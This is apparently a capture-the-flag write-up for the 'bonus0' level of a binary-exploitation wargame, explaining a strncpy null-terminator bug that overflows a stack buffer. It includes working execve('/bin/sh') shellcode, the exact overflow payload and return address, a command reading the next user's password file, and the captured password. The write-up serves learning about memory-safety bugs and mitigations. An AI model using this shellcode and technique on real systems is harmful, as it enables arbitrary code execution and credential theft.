# 🎯 Bonus0 - Null-Byte Poisoning Buffer Overflow

![Helldivers Strategic Deployment](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExaHQyYjR3NWV5bW5jZW5ha3JvNjFqZ3M5ZWVoM3R6Y2R4NGJ2NW8yYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/ckB5razpgN2rd4qTfe/giphy.gif)

Classic string handling vulnerability - when strncpy forgets the null terminator!

## 📋 Binary Analysis

### Function: p() - The Null-Byte Killer

```c
void p(char *dest, char *prompt)
{
	char *pcVar1;
	char buffer[4104];
	
	puts(prompt);
	read(0, buffer, 4096);
	
	// Replace newline with null terminator
	pcVar1 = strchr(buffer, 10);
	*pcVar1 = '\0';
	
	// ⚠️ CRITICAL: strncpy does NOT null-terminate if source >= 20 bytes!
	strncpy(dest, buffer, 20);
	return;
}
```

**The strncpy() Trap:**
- Copies **exactly** 20 bytes from `buffer` to `dest`
- If input is 20+ characters → **NO null terminator added!**
- This violates the assumption that C strings are null-terminated
- Sets up the next function for exploitation

---

### Function: pp() - The Overflow Amplifier

```c
void pp(char *param_1)
{
	char cVar1;
	uint uVar2;
	char *pcVar3;
	byte bVar4;
	char local_34[20];  // First buffer
	char local_20[20];  // Second buffer
	
	bVar4 = 0;
	
	p(local_34, " - ");  // Read first input (may lack null!)
	p(local_20, " - ");  // Read second input (may lack null!)
	
	// ⚠️ VULNERABLE: strcpy expects null-terminated string
	// If local_34 has no null, it keeps reading into local_20!
	strcpy(param_1, local_34);
	
	// Calculate string length (will read past local_34 if no null!)
	uVar2 = 0xffffffff;
	pcVar3 = param_1;
	do {
		if (uVar2 == 0) break;
		uVar2 = uVar2 - 1;
		cVar1 = *pcVar3;
		pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
	} while (cVar1 != '\0');
	
	// Add space separator
	(param_1 + (~uVar2 - 1))[0] = ' ';
	(param_1 + (~uVar2 - 1))[1] = '\0';
	
	// ⚠️ Concatenate second buffer (more overflow!)
	strcat(param_1, local_20);
	return;
}
```

**The Cascade Effect:**
1. `local_34` and `local_20` are adjacent 20-byte buffers
2. If `local_34` has no null terminator, `strcpy()` reads into `local_20`
3. This copies **40 bytes** instead of 20
4. Then adds a space (1 byte)
5. Then `strcat()` adds another **20 bytes** from `local_20`
6. **Total: 61 bytes written into main's 54-byte buffer!**

---

### Function: main() - The Victim

```c
int main(void)
{
	char buffer[54];  // ⚠️ Only 54 bytes!
	
	pp(buffer);       // Writes up to 61 bytes → overflow!
	puts(buffer);
	return;
}
```

---

### 🔑 Key Addresses

From GDB analysis:

| Element | Address | Notes |
|---------|---------|-------|
| **local_34** | `0xbffffbf8` | First 20-byte buffer in pp() |
| **local_20** | `0xbffffc0c` | Second 20-byte buffer (20 bytes after local_34) |
| **main's buffer** | `0xbffffc46` | 54-byte destination buffer |
| **SHELLCODE env** | `0xbffffd44` | Environment variable location |
| **Shellcode start** | `0xbffffd58` | After "SHELLCODE=" string (+20 bytes) |
| **EIP overwrite** | Position 9-12 of input 2 | Confirmed via pattern analysis |

---

## 🚨 Vulnerability: strncpy() Null-Byte Poisoning

### The Problem

The `strncpy()` function has a **dangerous quirk**:

```c
strncpy(dest, src, n);
```

**Behavior:**
- Copies **at most** `n` bytes from `src` to `dest`
- **If `src` has `n` or more characters** → copies exactly `n` bytes, **NO null terminator added!**
- **If `src` has fewer than `n` characters** → copies string + pads rest with null bytes

**Example:**

```c
char dest[20];
char src1[] = "short";           // 5 chars + null
char src2[] = "exactlytwentychars!!";  // 20 chars (no room for null!)

strncpy(dest, src1, 20);  // Result: "short\0\0\0\0..." (null-terminated ✅)
strncpy(dest, src2, 20);  // Result: "exactlytwentychars!!" (NO null! ❌)
```

**Why this is dangerous:**
- Other string functions (`strcpy`, `strlen`, `strcat`) **expect null terminators**
- Without null bytes, they **read past buffer boundaries**
- This creates a "null-byte poisoning" attack vector

---

### Memory Layout

**Stack layout in pp():**

```
Low Address
┌────────────────────────┐
│ local_34 [20 bytes]    │ ← First input (may lack \0)
│ AAAAAAAAAAAAAAAAAAAA   │
├────────────────────────┤
│ local_20 [20 bytes]    │ ← Second input (may lack \0)
│ BBBBBBBBBBBBBBBBBBBB   │
├────────────────────────┤
│ [other stack data]     │
├────────────────────────┤
│ saved EBP              │
├────────────────────────┤
│ return address         │ ← Target for overwrite!
└────────────────────────┘
High Address
```

**What happens when both buffers lack null terminators:**

```
strcpy(param_1, local_34):
- Looks for null terminator in local_34
- Doesn't find it (20 bytes, no null)
- Keeps reading into local_20
- Copies: "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB" (40 bytes!)

strlen(param_1):
- Scans for null terminator
- Finds it at position 40
- Returns length 40

Add space and null:
param_1[40] = ' '
param_1[41] = '\0'
- Now: "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB \0"

strcat(param_1, local_20):
- Appends local_20 starting at param_1[40]
- Writes: "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBB\0"
- Total length: 40 + 1 + 20 = 61 bytes
```

**Overflow calculation:**

```
Main's buffer size: 54 bytes
Data written: 61 bytes
Overflow: 61 - 54 = 7 bytes

Memory layout after overflow:
┌────────────────────────────────────────────┐
│ buffer[54] = "AAA...BBB...BBB BBB...BBB"  │ 54 bytes
├────────────────────────────────────────────┤
│ saved EBP                                  │ 4 bytes (partially overwritten)
├────────────────────────────────────────────┤
│ return address = 0x????????               │ 4 bytes (overwritten! ✅)
└────────────────────────────────────────────┘
```

---

## 🎯 How the Exploit Works

### The Three-Phase Attack

#### Phase 1: Null-Byte Poisoning

**Goal:** Remove null terminators from both buffers

**Technique:**
- Input exactly **20 characters** to each `p()` call
- `strncpy()` copies all 20 bytes with **no null terminator**
- Both `local_34` and `local_20` are now "poisoned" (no null bytes)

**Result:**
```
local_34: [A][A][A]...[A][A] (20 bytes, no \0)
local_20: [B][B][B]...[B][B] (20 bytes, no \0)
```

---

#### Phase 2: Controlled Overflow

**Goal:** Overflow main's buffer to overwrite return address

**Technique:**
- `strcpy()` reads past `local_34` into `local_20` (40 bytes)
- Add space separator (1 byte)
- `strcat()` adds `local_20` again (20 bytes)
- **Total: 61 bytes into 54-byte buffer**

**Payload structure for input 2:**
```
[9 bytes padding][4 bytes return address][7 bytes overflow]
 └─ "BBBBBBBBB" └─ 0xbffffd58 (shellcode) └─ "CCCCCCC"
```

**Why 9 bytes padding?**
- From GDB pattern analysis, EIP overwrite occurs at bytes 9-12 of input 2
- First 9 B's fill the buffer up to the return address position
- Next 4 bytes (our shellcode address) overwrite the return address
- Last 7 bytes complete the overflow

---

#### Phase 3: Environment Variable Shellcode

**Goal:** Execute shellcode from a predictable memory location

**Why environment variables?**
- No size constraints (unlike stack/heap buffers)
- Predictable addresses (no ASLR on this system)
- Survives across function calls
- Located on the stack, above main's frame

**Setup:**
```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0...\xcd\x80"')
```

**Memory layout:**
```
Environment space (high stack addresses):
┌─────────────────────────────────────────────┐
│ SHELLCODE=\x90\x90\x90....[24-byte shellcode]│ ← 0xbffffd44
│            └─200 NOPs─────┘                 │
└─────────────────────────────────────────────┘
         ↑
         └─ We jump to 0xbffffd58 (NOP sled)
```

**Why the NOP sled?**
- Gives us a **200-byte landing zone**
- Even if address is slightly off, we'll hit a NOP
- NOPs "slide" execution down to the shellcode
- Makes exploit more reliable

---

### Complete Execution Flow

```
┌─ 1. User runs exploit ─────────────────────────────────────┐
│   Input 1: "AAAAAAAAAAAAAAAAAAAA" (20 A's)                 │
│   Input 2: "BBBBBBBBB\x58\xfd\xff\xbfCCCCCCC"              │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 2. p() processes inputs ──────────────────────────────────┐
│   strncpy(local_34, "AAA...A", 20) → no null terminator!  │
│   strncpy(local_20, "BBB...B\x58...", 20) → no null!      │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 3. pp() creates overflow ─────────────────────────────────┐
│   strcpy(): reads 40 bytes (local_34 + local_20)          │
│   Adds space: 41 bytes total                              │
│   strcat(): adds 20 more bytes from local_20              │
│   Total: 61 bytes into 54-byte buffer                     │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 4. Return address overwritten ────────────────────────────┐
│   Stack before:  [buffer][EBP][0x08048xxx] ← normal       │
│   Stack after:   [buffer][EBP][0xbffffd58] ← shellcode!   │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 5. Function returns ──────────────────────────────────────┐
│   ret instruction: EIP = 0xbffffd58                        │
│   CPU jumps to environment variable                        │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 6. Shellcode executes ────────────────────────────────────┐
│   Lands in NOP sled (\x90\x90\x90...)                     │
│   Slides down to shellcode                                 │
│   execve("/bin/sh", NULL, NULL)                           │
└────────────────────────────────────────────────────────────┘
                          ↓
                    🎉 Shell spawned! 🎉
```

---

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Buffer overflow** | ✅ | `strncpy()` no null + `strcpy()` no bounds = 61 bytes into 54-byte buffer |
| **EIP control** | ✅ | Bytes 9-12 of input 2 directly overwrite return address |
| **Shellcode location** | ✅ | Environment variable at predictable address `0xbffffd58` |
| **Executable memory** | ✅ | No DEP/NX → stack is executable |
| **Predictable addresses** | ✅ | No ASLR → addresses are the same every run |
| **No stack canaries** | ✅ | No stack protection → overflow goes undetected |

---

### Key Insight

Bonus0 builds on techniques from earlier levels, specifically Level2's return-to-heap approach, but uses a **more flexible technique**:

**Level2 (Return-to-Heap):**
- Used `strdup()` to copy shellcode to heap
- Heap address: `0x0804a008`
- Size limited by buffer length (80 bytes)
- Required bypassing stack address check (`0xb0000000`)

**Bonus0 (Return-to-Environment):**
- Uses environment variables for shellcode storage
- Environment address: `0xbffffd58` (high stack)
- **No size constraints** (can be kilobytes if needed!)
- More reliable with NOP sled (200-byte landing zone)
- Addresses are in stack range but above overflow location

The environment variable technique is more powerful because:
1. **Unlimited size** - can store complex payloads
2. **Persistent** - survives across multiple executions
3. **Predictable** - always at similar addresses (no ASLR)
4. **Flexible** - can store multiple payloads or ROP chains

This evolution shows how attackers adapt to different constraints while maintaining the core exploitation principle: control EIP and execute arbitrary code.

---

## 💣 Execute the Exploit

### Step 1: Export Shellcode

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

**Shellcode breakdown:**
- **200 NOPs (`\x90`)**: Landing zone for imprecise jumps
- **24-byte execve shellcode**: Spawns `/bin/sh`

**Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428)  
**Author:** Touhid M.Shaikh  
**Platform:** Linux x86 (32-bit)

---

### Step 2: Find Shellcode Address (Optional)

If you need to verify the address:

```bash
gdb ./bonus0
```

```gdb
run
# Input: AAAAAAAAAAAAAAAAAAAA
# Input: BBBBBBBBBBBBBBBBBBBB
x/500s $esp
```

Look for:
```
0xbffffd44:  "SHELLCODE=\220\220\220\220..."
```

Add 20 bytes to skip "SHELLCODE=" → Target: `0xbffffd58`

---

### Step 3: Run the Exploit

```bash
(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
```

**Payload breakdown:**
- **Input 1:** `"A"*20` (fills `local_34` with no null terminator)
- **Input 2:** 
  - `"B"*9` (padding to reach return address position)
  - `"\x58\xfd\xff\xbf"` (shellcode address in little-endian: `0xbffffd58`)
  - `"C"*7` (remaining overflow bytes)
- **`cat`:** Keeps stdin open for shell interaction

---

### Step 4: Read the Flag

Once you get the shell prompt:

```bash
cat /home/user/bonus1/.pass
```

**Result:**
```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

## 🛡️ Pro Tips & Security Notes

### The `cat` Trick

**Why use `cat` in the exploit?**

```bash
(payload) | ./bonus0          # ❌ Shell exits immediately
(payload; cat) | ./bonus0     # ✅ Shell stays open
```

When using pipes, stdin closes after the payload. Adding `cat` keeps stdin open, allowing you to interact with the spawned shell.

---

### Modern Defenses Against This Attack

| Protection | Effect | Bypass Difficulty |
|------------|--------|------------------|
| **ASLR** | Randomizes stack/env addresses | High - requires info leak |
| **DEP/NX** | Marks stack non-executable | High - need ROP or ret2libc |
| **Stack Canaries** | Detects buffer overflows | Medium - can leak or brute-force |
| **FORTIFY_SOURCE** | Checks `strcpy/strcat` bounds | High - compile-time mitigation |
| **Safer APIs** | Use `strncpy_s/strlcpy` | N/A - prevents bug entirely |

---

### Why `strncpy()` is Dangerous

From the [strncpy(3) man page](https://man7.org/linux/man-pages/man3/strncpy.3.html):

> "If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated."

**Safer alternatives:**
- `strlcpy()` (BSD/macOS) - always null-terminates
- `strncpy_s()` (C11 Annex K) - bounds-checked version
- Manual: `strncpy()` + explicit null: `dest[n-1] = '\0'`

---

### Fun Fact: The `cat` Command

The `cat` command is often used in exploits not just to display files, but to **keep stdin open** for interactive shells. This technique dates back to early Unix exploitation in the 1990s.

---

### Related Resources

- **strncpy() pitfalls:** [CERT C Coding Standard - STR03-C](https://wiki.sei.cmu.edu/confluence/display/c/STR03-C.+Do+not+inadvertently+truncate+a+null-terminated+byte+string)
- **Environment variables in memory:** [GNU C Library Manual](https://www.gnu.org/software/libc/manual/html_node/Environment-Variables.html)
- **Shellcode source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428)

---

## 🎉 Victory

**Password for bonus1:**
```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

**Techniques mastered:**
- Null-byte poisoning via `strncpy()`
- Multi-stage buffer overflow
- Environment variable shellcode injection
- Return-to-environment exploitation

**Next level:** `ssh bonus1@localhost -p 2222`
